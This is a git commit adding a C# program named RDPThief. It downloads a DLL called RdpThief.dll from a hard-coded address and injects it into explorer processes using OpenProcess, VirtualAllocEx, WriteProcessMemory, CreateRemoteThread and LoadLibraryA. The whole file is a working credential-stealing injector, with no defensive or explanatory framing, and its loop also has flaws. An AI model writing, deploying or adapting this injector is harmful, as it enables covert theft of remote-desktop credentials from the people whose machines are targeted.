93607a322c625abf3a1ba4dcbea719930722c7b1
Relwarc17 <relwarc17@relwac17.icu>
2024-11-02 19:19:12 +0100

    Add project files.

---
+++ RDPThief/RDPThief.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace RDPThief
+{
+    public class RDPThief
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        static void Main(string[] args)
+        {
+            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            //String dllName = "C:\\Users\\carlo\\Danger-stranger\\rtsd12.dll";
+            String dllName = dir + "\\RdpThief.dll";
+
+            WebClient wc = new WebClient();
+            wc.DownloadFile("http://192.168.45.192/RdpThief.dll", dllName);
+
+            Process[] expProc = Process.GetProcessesByName("explorer");
+
+            while (expProc.Length <= 0) 
+            {
+                Thread.Sleep(1000);
+            }
+
+            for (int i = 0; i < expProc.Length; i++)
+            {
+
+                int pid = expProc[0].Id;
+
+                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+
+                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4);
+
+                IntPtr outSize;
+                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+
+                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+
+                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+            }
+
+
+        }
+    }
+}
